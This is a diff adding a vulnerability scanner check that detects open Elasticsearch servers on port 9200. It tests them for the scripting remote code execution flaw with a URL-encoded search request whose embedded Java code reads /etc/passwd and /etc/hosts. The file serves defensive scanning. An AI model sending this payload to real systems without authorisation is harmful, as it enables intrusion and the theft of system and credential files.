@@ -1,0 +1,74 @@
+#include helpers.inc;
+#include classMatches.inc;
+// **************************************************************************************							 
+function alert(fname, matchedText)
+{	
+	var ri = new TReportItem();
+	ri.LoadFromFile(fname);
+	ri.affects = "Web Server";
+	ri.alertPath = "Scripts/" + fname; 	
+		
+	ri.setHttpInfo(lastJob);
+	
+	if (matchedText) 
+		ri.Details =  ri.Details + "[break]Pattern found: [pre][blue]" + matchedText + "[/blue][/pre]";	
+	
+	addHTTPJobToCrawler(lastJob, 1, 1);
+	AddReportItem(ri);	
+}							 
+// **************************************************************************************							 
+function request(uri, port)
+{
+	lastJob = new THTTPJob();
+		
+	lastJob.url = scanURL;
+	lastJob.verb = 'GET';
+	lastJob.addCookies = false;
+	lastJob.URI = uri;    
+	
+	hostname = lastJob.host;
+	portIndex = hostname.indexOf(":");
+	if (portIndex > 0) hostname = hostname.substring(0, portIndex);
+		
+	if (port != 80)	lastJob.host = hostname + ':' + port;
+	else lastJob.host = hostname;
+			
+	lastJob.execute();	
+	if (!lastJob.wasError && lastJob.response.msg2 == 200 && !lastJob.notFound)
+	{
+		return true;
+	}	
+	
+	return false;
+}
+// **************************************************************************************
+function Test(port)
+{
+	if (request("/", port))
+	{
+		var pattern = '"tagline" : "You Know, for Search"';
+		
+		if (lastJob.response.body.indexOf(pattern) != -1) {				
+			alert("elasticsearch_open.xml", pattern); 	
+			
+			pattern = ',"/etc/passwd":["root:';
+			
+			if (request("/_search?source=%7B%22size%22%3A1%2C%22query%22%3A%7B%22filtered%22%3A%7B%22query%22%3A%7B%22match_all%22%3A%7B%7D%7D%7D%7D%2C%22script_fields%22%3A%7B%22%2Fetc%2Fhosts%22%3A%7B%22script%22%3A%22import%20java.util.*%3B%5Cnimport%20java.io.*%3B%5Cnnew%20Scanner(new%20File(%5C%22%2Fetc%2Fhosts%5C%22)).useDelimiter(%5C%22%5C%5C%5C%5CZ%5C%22).next()%3B%22%7D%2C%22%2Fetc%2Fpasswd%22%3A%7B%22script%22%3A%22import%20java.util.*%3B%5Cnimport%20java.io.*%3B%5Cnnew%20Scanner(new%20File(%5C%22%2Fetc%2Fpasswd%5C%22)).useDelimiter(%5C%22%5C%5C%5C%5CZ%5C%22).next()%3B%22%7D%7D%7D&callback=z", port)) {
+				if (lastJob.response.body.indexOf(pattern) != -1) {				
+					alert("elasticsearch_rce.xml", pattern); 	
+				}
+				
+			}
+		}
+	}
+}
+// **************************************************************************************	
+function startTesting()
+{
+	Test(9200);
+}
+/***********************************************************************************/
+/* main entry point */
+var matches = new classMatches();
+var lastJob = null;
+startTesting();
